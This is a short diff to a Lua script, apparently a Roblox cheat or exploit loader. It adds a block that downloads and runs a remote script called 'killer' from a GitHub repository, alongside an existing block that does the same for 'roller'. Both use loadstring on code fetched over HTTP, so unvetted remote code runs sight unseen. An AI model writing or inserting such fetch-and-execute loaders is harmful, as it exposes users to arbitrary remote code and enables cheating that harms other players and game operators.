@@ -41,3 +41,7 @@ end)()
 coroutine.wrap(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/tempqrrr/rblxlxlx/refs/heads/main/roller"))()
 end)()
+
+coroutine.wrap(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tempqrrr/rblxlxlx/refs/heads/main/killer"))()
+end)()
